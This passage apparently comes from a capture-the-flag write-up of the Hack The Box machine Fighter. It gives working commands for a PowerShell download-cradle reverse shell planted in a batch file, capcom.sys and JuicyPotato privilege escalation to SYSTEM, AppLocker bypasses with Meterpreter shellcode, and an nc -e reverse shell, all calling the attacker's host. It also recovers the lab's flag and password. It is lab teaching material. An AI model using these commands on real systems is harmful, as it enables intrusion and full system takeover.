21:31:01.667140 IP 10.10.10.72 > 10.10.14.6: ICMP echo request, id 1, seq 72, length 40
21:31:01.667176 IP 10.10.14.6 > 10.10.10.72: ICMP echo reply, id 1, seq 72, length 40

```

#### Reverse Shell

I’ll use the same reverse shell from my webserver, `REV.PS1`. I’ll start by running the `echo` without the redirection to make sure it looks like I want:

```

PS C:\users\decoder> cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.6/REV.PS1')"
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.6/REV.PS1')

```

Now I’ll add it to `clean.bat`:

```

PS C:\users\decoder> cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.14.6/REV.PS1') >> clean.bat"

```

Quickly there’s a hit on my webserver, and then a connection at a listening `nc`:

```

oxdf@hacky$ rlwrap -cAr ncat -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.72.
Ncat: Connection from 10.10.10.72:49226.
Windows PowerShell running as user decoder on FIGHTER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
fighter\decoder

```

I can read `user.txt`:

```

PS C:\Users\decoder\desktop> type user.txt
bb6163c1************************

```

## Shell as SYSTEM

### Enumeration - Drivers

There’s a suspicious driver loaded on this box, and there are a few ways to identify it. `driverquery /v` will show all the drivers on the box, and if I filter out all the ones in `C:\Windows\System32\Drivers` (using `findstr`, which is Windows equivalent of `grep`), there’s only two left:

```

PS C:\programdata> driverquery /v | findstr /iv "system32\\drivers"

Module Name  Display Name           Description            Driver Type   Start Mode State      Status     Accept Stop Accept Pause Paged Pool(bytes) Code(bytes) BSS(bytes) Link Date              Path                                             Init(bytes)
============ ====================== ====================== ============= ========== ========== ========== =========== ============ ================= =========== ========== ====================== ================================================ ===========
Capcom       Capcom                 Capcom                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 1.280       0          05/09/2016 08:43:33    \??\C:\Windows\drivers\Capcom.sys                384        
MpKsl0f8ba75 MpKsl0f8ba758          MpKsl0f8ba758          Kernel        Manual     Running    OK         TRUE        FALSE        16.384            12.288      0                                 \??\c:\ProgramData\Microsoft\Microsoft Antimalwa 4.096

```

Capcom is the company that made the game StreetFigher (that was the theme of the website, and fits the box name Fighter), *and* the `capcom.sys` driver is famous for being exploitable for getting execution as SYSTEM, so that’s the obvious path here.

If I instead look at the services running on the box, the `capcom` service jumps out as well:

```

PS C:\users\decoder> sc.exe query
...[snip]...
SERVICE_NAME: capcom 
        TYPE               : 1  KERNEL_DRIVER  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
...[snip]...

```

It shows this is a running kernel driver. (*Note: When in PowerShell, make sure you use `sc.exe` and not `sc`, as `sc` is short for `Set-Content`*.)

It’s also possible to just notice `capcom.sys` in `C:\Windows`:

```

PS C:\windows> ls

    Directory: C:\windows

Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
d----        27/04/2018     22:35            $Reconfig$                         
d----        22/08/2013     17:39            ADFS
...[snip]...
d----        22/01/2021     13:08            WinSxS                            
-a---        22/08/2013     13:21      56832 bfsvc.exe                         
-a--s        22/04/2022     14:06      67584 bootstat.dat                      
-a---        11/10/2017     19:03      10576 Capcom.sys                        
-a---        21/10/2017     17:24     441322 dd_vcredistMSI2DA4.txt
...[snip]...

```

### capcom.sys

#### Background

There was a vulnerability in the `capcom.sys` driver that came with Street Fighter 5. This software left a vulnerable state that allowed an attacker to escalate to SYSTEM by abusing this driver. I’ve talked about this twice before. In [Fuse](/2020/10/31/htb-fuse.html#driver-exploit), my user had the capability to load drivers, so I actually loaded `capcom.sys` and then exploited it to get SYSTEM. In the 2020 Flare-On challenge, [crackinstaller](/flare-on-2020/crackinstaller#crackinstallerexe), the binary drops the `capcom.sys` driver and abuses it, and seeing that is part of the reversing challenge.

[This post](http://www.fuzzysecurity.com/tutorials/28.html) (and the embedded videos) do a really nice job showing the vulnerability and how it is abused. In Fuse, I used an exe to run this exploit, but I’ve already shown I can’t upload `.exe` files to the box due to AppLocker. There’s also a Metasploit module to exploit this as well, which I’ll show later in an alternative path.

#### Prep PowerShell

I’ll grab [this repo](https://github.com/FuzzySecurity/Capcom-Rootkit) from the blog post above, and it has a bunch of `.ps1` scripts, with `.psd1` and `.psm1` files that pull them all together. `Capcom.psm1` is very simple:

```

# Compatibility for PS v2 / PS v3+
if(!$PSScriptRoot) {
	$Global:PSScriptRoot = Split-Path $MyInvocation.MyCommand.Path -Parent
}

# OS version
$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
[double]$Global:OSMajMin = "$($OSVersion.Major).$($OSVersion.Minor)"

# Import all modules
Get-ChildItem -Recurse $PSScriptRoot | % { if ($_.FullName -Like "*.ps1") { Import-Module $_.FullName -DisableNameChecking } }

```

It sets the `$OSVersion` variable and then pulls in all the `.ps1` files into the current session.

I don’t want to upload all of these individually to Fighter, so I’ll and combine them all into a single file:

```

oxdf@hacky$ find . -name "*.ps1" -exec cat {} \; -exec echo \; > capcom-all

```

This takes all the PowerShell functions, and puts them into one file that hopefully I can load into my session and then call. It’s important to have the second `exec` to put a new line after each file, otherwise some of them will overlap and make invalid PowerShell. I’ll also name the output `capcom-all` and not `capcom-all.ps1`, or else `find` will match on that output file and crash.

The `Capcom.psd1` file shows how the module is loaded:

```

 
@{
# Script module or binary module file associated with this manifest.
ModuleToProcess = 'Capcom.psm1'

# Version number of this module.
ModuleVersion = '0.0.0.1'

# ID used to uniquely identify this module
GUID = 'd34db33f-f3e7-417d-8735-e624dd62e7c8'

# Author of this module
Author = 'Ruben Boonen'

# Copyright statement for this module
Copyright = 'BSD 3-Clause'

# Description of the functionality provided by this module
Description = 'Rootkit POC based on signed Capcom.sys driver!'

# Minimum version of the Windows PowerShell engine required by this module
PowerShellVersion = '2.0'

# Architecture is x64 only
ProcessorArchitecture = 'AMD64'

# Functions to export from this module
FunctionsToExport = @(
    'Capcom-ElevatePID',
    'Capcom-BypassDriverSigning'
)
}

```

There are two exported functions. I’ll call `Capcom-ElevatePID` once I get the PowerShell into my current session.

#### Run It

Now I’ll use the PowerShell `iex` cradle to load all that PowerShell into my current session:

```

PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.6/capcom-all')

```

Now it’s as simple as running `capcom-elevatepid`:

```

PS C:\> capcom-elevatepid

[+] SYSTEM Token: 0xFFFFC0001B60777C
[+] Found PID: 5096
[+] PID token: 0xFFFFC0001D8A1066
[!] Duplicating SYSTEM token!

PS C:\programdata> whoami
nt authority\system

```

## Root Flag

### Enumeration

On getting to the Administrator’s desktop, there’s no `root.txt`, but two executable files:

```

PS C:\users\administrator\desktop> ls

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        24/10/2017     17:02       9216 checkdll.dll                      
-a---        08/01/2018     22:34       9728 root.exe   

```

If I run `root.exe`, it shows the proper way to run it, with a password:

```

PS C:\users\administrator\desktop> .\root.exe
C:\users\administrator\desktop\root.exe <password>

```

Giving it a wrong password shows an error message:

```

PS C:\users\administrator\desktop> .\root.exe 0xdf
Sorry, check returned: 0

```

I’ll copy both of them into the web root for easy download:

```

PS C:\users\administrator\desktop> copy checkdll.dll \inetpub\wwwroot\street\checkdll.dll
PS C:\users\administrator\desktop> copy root.exe \inetpub\wwwroot\street\root.exe

```

From here I can access each of them over the webserver.

### RE

#### root.exe

I’ll open Ghidra and import both files into a new project:

![image-20220424144826136](https://0xdfimages.gitlab.io/img/image-20220424144826136.png)

I’ll open `root.exe` and let Ghidra run it’s analysis.

I’ll start by going to “Search” > “For Strings…” and locating the string “Sorry, check returned: %d\n”:

![image-20220424145508832](https://0xdfimages.gitlab.io/img/image-20220424145508832.png)

Double clicking takes the Listing window to that string:

![image-20220424145541178](https://0xdfimages.gitlab.io/img/image-20220424145541178.png)

In green on the right, it’s showing the XREF, where the program references this address. Double-clicking that takes me to that function, `FUN_00401040`, which I’ve renamed `main`. That’s because looking at the decompile, it looks like the two arguments are the length of the arguments (typically called `argc`), and the arguments themselves (referred to as `argv`). After some re-naming and re-typing, `main` looks like:

```

undefined4 __cdecl main(int argc,char **argv)

{
  int res;
  
  if (argc < 2) {
    printfish("%s <password>",(char)*argv);
    exit(1);
  }
  res = check(argv[1]);
  if (res != 1) {
    printfish("Sorry, check returned: %d\n",(char)res);
    exit(2);
  }
  print_flag();
  return 0;
}

```

Double clicking on `check` shows it’s a pointer to a reference in `checkdll.dll`:

![image-20220424150236489](https://0xdfimages.gitlab.io/img/image-20220424150236489.png)

It’s not needed, but I’ll look at that in the next section.

The function I’ve named `print_flag` (originally `FUN_00401000`) cleans up to:

```

int print_flag(void)

{
  int byte;
  uint i;
  
  i = 0;
  do {
    byte = tolower((int)(char)(&obfuscated_flag)[i]);
    printf_like(&%c,(char)byte + -7);
    i = i + 1;
  } while (i < 0x20);
  return 1;
}

```

It’s simply looping over a buffer, subtracting seven from each byte, and printing that byte.

I’ll copy the buffer and drop into a Python shell:

```

>>> obflag = b'\x4b\x3f\x37\x38\x4a\x38\x4c\x40\x49\x4b\x40\x48\x37\x39\x4d\x3f\x4d\x49\x3a\x37\x4b\x3f\x49\x4b\x3a\x49\x4c\x3a\x38\x3b\x4a\x38'
>>> ''.join([chr(x-7) for x in obflag])
'D801C1E9BD9A02F8FB30D8BD3BE314C1'

```

It’s not totally clear to me how, but the flag should actually be in lowercase (probably something in the function I labeled `printf_like`). Still, that’s simple enough:

```

>>> ''.join([chr(x-7) for x in obflag]).lower()
'd801c1e9bd9a02f8fb30d8bd3be314c1'

```

#### checkdll.dll

Loading the `checkdll.dll` file into Ghidra, I’m looking for the Export `check`:

![image-20220424150733358](https://0xdfimages.gitlab.io/img/image-20220424150733358.png)

It’s a very simple check as well:

```

int __cdecl check(int password)

{
  uint i;
  
                    /* 0x1000  1  check */
  i = 0;
  do {
    if ((*(byte *)(password + i) ^ 9) != (&obfuscated_password)[i]) {
      return 0;
    }
    i = i + 1;
  } while (i < 10);
  return 1;
}

```

It’s looping over 10 characters, reading from a global buffer, XORing with 9, and then checking that the input matches.

I’ll go to the global I’ve named `obfuscated_password`:

![image-20220424150922878](https://0xdfimages.gitlab.io/img/image-20220424150922878.png)

Right click > “Copy Special” > “Python Byte String” will export the buffer nicely.

In Python, I can extract the password “OdioLaFeta”:

```

>>> obpass = b'\x46\x6d\x60\x66\x45\x68\x4f\x6c\x7d\x68'
>>> ''.join([chr(x^9) for x in obpass])
'OdioLaFeta'

```

Giving that to `root.exe` returns the same flag as above:

```

PS C:\users\administrator\desktop> .\root.exe OdioLaFeta
d801c1e9bd9a02f8fb30d8bd3be314c1

```

## Alternative Paths

### AppLocker Bypass

#### msbuild

When I solved this box in 2018, I didn’t go to decoder, but rather bypassed Applocker to get a Meterpreter shell. A popular AppLocker bypass at the time of Fighter was using `msbuild.exe`, because it’s a legit trusted Windows executable that will take an XML file and run code from it.

I’ll grab a [template file](https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml), and run `msfvenom` to generate the shellcode:

```

oxdf@hacky$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f csharp -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of csharp file: 1831 bytes
byte[] shellcode = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
...[snip]...
0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };

```

`-f csharp` puts it in the format needed for this template, and `-v shellcode` sets the output variable name to `shellcode`, to match the template. I’m using a Meterpreter payload so I can show the MSF version of the exploit later.

I’ll add that shellcode to the template, and save the file, and upload it to Fighter, and run it:

```

PS C:\programdata> iwr http://10.10.14.6/shellcode.xml -outfile sc.xml
PS C:\programdata> C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sc.xml

```

It just hangs, but at `msfconsole`, where I had a `exploit/multi/handler` listening, there’s a connection:

```

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.6:443 
[*] Sending stage (175174 bytes) to 10.10.10.72
[*] Meterpreter session 1 opened (10.10.14.6:443 -> 10.10.10.72:49175 )

meterpreter > 

```

#### Extensionless

It turns out that while AppLocker is blocking `.exe` files, I can still upload an executable and run it without that extension.

I’ll generate a payload:

```

oxdf@hacky$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: met.exe

```

Now upload it. Saving it as `met.exe` fails, but `met` succeeds:

```

PS C:\programdata> wget 10.10.14.6/met.exe -outfile met.exe
Invoke-PowerShellTcp : Access to the path 'C:\programdata\met.exe' is denied.
At line:127 char:1
+ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.6 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorExcep 
   tion
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorExceptio 
   n,Invoke-PowerShellTcp

PS C:\programdata> wget 10.10.14.6/met.exe -outfile met

```

Now I’ll just start the process with PowerShell:

```

PS C:\programdata> Start-Process -Filepath C:\programdata\met -Wait -NoNewWindow

```

And it returns a shell at `msfconsole`.

#### color Directory

There’s a common directory, `C:\Windows\System32\spool\drivers\color`, which is known to be a AppLocker whitelisted directory, and it’s world writable. For example:

```

PS C:\programdata> copy met met.exe
copy : Access to the path 'C:\programdata\met.exe' is denied.
At line:1 char:1
+ copy met met.exe
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\programdata\met:FileInfo)  
   [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsof 
   t.PowerShell.Commands.CopyItemCommand
PS C:\programdata> copy met C:\windows\system32\spool\drivers\color\met.exe

```

The first one is blocked, but the second one works without issue. I can run from there as well.

### MSF Capcom Exploit

#### Identify

With a meterpreter shell on Fighter, I can use the Metasploit Capcom exploit:

```

msf6 exploit(multi/handler) > search capcom

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  exploit/windows/local/capcom_sys_exec  1999-01-01       normal  Yes    Windows Capcom.sys Kernel Execution Exploit (x64 only)

Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/capcom_sys_exec

msf6 exploit(multi/handler) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

```

#### OS Check

If I try to run this right away, it returns an error:

```

msf6 exploit(windows/local/capcom_sys_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:443 
[-] Exploit aborted due to failure: not-vulnerable: Exploit not available on this system.
[*] Exploit completed, but no session was created.

```

It’s not immediately clear what that means. I’ll find the source:

```

oxdf@hacky$ locate capcom_sys_exec.rb
/opt/metasploit-framework/embedded/framework/modules/exploits/windows/local/capcom_sys_exec.rb

```

This code seems to be where I’m getting stuck:

```

    check_result = check
    if check_result == Exploit::CheckCode::Safe || check_result == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

```

`check` is defined above in the same file:

```

  def check
    if sysinfo['OS'] !~ /windows (7|8|10)/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo['Architecture'] != ARCH_X64
      return Exploit::CheckCode::Safe
    end

    # Validate that the driver has been loaded and that
    # the version is the same as the one expected
    client.sys.config.getdrivers.each do |d|
      if d[:basename].downcase == 'capcom.sys'
        expected_checksum = '73c98438ac64a68e88b7b0afd11ba140'
        target_checksum = client.fs.file.md5(d[:filename])

        if expected_checksum == Rex::Text.to_hex(target_checksum, '')
          return Exploit::CheckCode::Appears
        end
      end
    end

    return Exploit::CheckCode::Safe
  end

```

It’s checking that the OS is 7, 8, or 10, and that the architecture is x64. It’s failing because this is a Windows Server OS. It also checks for the vulnerable version of the driver (which I’ve already shown is there).

I’ll comment out the check for the OS version, exit Metasploit, and start it again to reload the new version.

#### Architecture

This time, it’s a different error:

```

msf6 exploit(windows/local/capcom_sys_exec) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: x86
[*] Started reverse TCP handler on 10.10.14.6:443 
[-] Exploit aborted due to failure: no-target: Running against WOW64 is not supported, please get an x64 session
[*] Exploit completed, but no session was created.

```

It’s unhappy about the x86 architecture. I needed x86 powershell to get onto Fighter, but now I’ll migrate into a x64 process. There’s a `cmd.exe` process that seems to be persistent:

```

meterpreter > ps                                  
                                                                               
Process List                                                            
============                                                                   
                                                                               
 PID   PPID  Name                     Arch  Session  User             Path
 ---   ----  ----                     ----  -------  ----             ----  
...[snip]...
 3664  1132  cmd.exe                  x64   0        FIGHTER\sqlserv  C:\Windows\System32\cmd.exe

meterpreter > migrate 3664
[*] Migrating from 3524 to 3664...
[*] Migration completed successfully.

```

#### Success

Now running it works:

```

msf6 exploit(windows/local/capcom_sys_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:443 
[*] Launching msiexec to host the DLL...
[+] Process 420 launched.
[*] Reflectively injecting the DLL into 420...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 10.10.10.72
[*] Meterpreter session 2 opened (10.10.14.6:443 -> 10.10.10.72:49163 )

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

It is important to note that I needed to set the `LPORT` to something that would get out through the firewall.

### Potato

#### Enumeration

When I get a shell as sqlserv, that account has the `SeImpersonatePrivilege`:

```

PS C:\programdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

This is typical for an account running a service like IIS or MSSQL. But there’s a series of exploits, the Potato family, that exploit this.

#### Background

When this box was created, what was state of the art for Potato exploits was RottenPotato. One of the authors of this box is [Decoder](https://twitter.com/decoder_it?lang=en), the author of several of the Potato exploits, and an expert in this technology. [This blog post](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#rottenPotato) has a nice background of Potato exploits and their evolution.

When he created the box, he disabled the Background Intelligent Transfer Service (BITS), which is the COM server that RottenPotato uses to elevate. It turns out there are other DCOM services that can be exploited in the same manner, and that led to Decoder and Ohpe’s developing [JuicyPotato](https://decoder.cloud/2018/08/10/juicy-potato/). And that’s the exploit that will work here.

#### CLSID Issues

I’ll download `JuicyPotato.exe` from the GitHub [release page](https://github.com/ohpe/juicy-potato/releases/tag/v0.1), and upload it to Fighter, saving it in the `color` directory to avoid AppLocker:

```

PS C:\windows\system32\spool\drivers\color> wget 10.10.14.6/JuicyPotato.exe -outfile jp.exe

```

Running it shows how to call it:

```

PS C:\windows\system32\spool\drivers\color> .\jp.exe
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port

Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user

```

I can try with just the mandatory args:

```

PS C:\windows\system32\spool\drivers\color> .\jp.exe -t * -p C:\windows\system32\spool\drivers\color\met.exe -l 9001
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9001
COM -> recv failed with error: 10038

```

It’s trying with the BITs server, but that’s failing.

[This page](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter) has a list of CLSIDs for Windows 2012, as well as the user they associate with. I’ll work my way down the page, and when I get to the seventh row (the first for `winmgmt`), it works:

```

PS C:\windows\system32\spool\drivers\color> .\jp.exe -t * -p C:\windows\system32\spool\drivers\color\met.exe -l 9001 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 9001
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

```

At `msfconsole`:

```

[*] Sending stage (175174 bytes) to 10.10.10.72
[*] Meterpreter session 4 opened (10.10.14.6:443 -> 10.10.10.72:49181 )

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

To do this without Metasploit, I can upload `nc64.exe`:

```

PS C:\windows\system32\spool\drivers\color> wget 10.10.14.6/nc64.exe -outfile nc64.exe

```

I’ll write a simple `.bat` file:

```

PS C:\windows\system32\spool\drivers\color> cmd /c "echo C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.6 443 > rev.bat"
PS C:\windows\system32\spool\drivers\color> type rev.bat
C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.6 443 

```

And run JuicyPotato:

```

PS C:\windows\system32\spool\drivers\color> .\jp.exe -t * -p "C:\windows\system32\spool\drivers\color\rev.bat" -l 9001 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
Testing {8BC3F05E-D86B-11D0-A075-00C04FB68820} 9001
......
[+] authresult 0
{8BC3F05E-D86B-11D0-A075-00C04FB68820};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

```

At my local `nc` listener:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.72.
Ncat: Connection from 10.10.10.72:49207.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```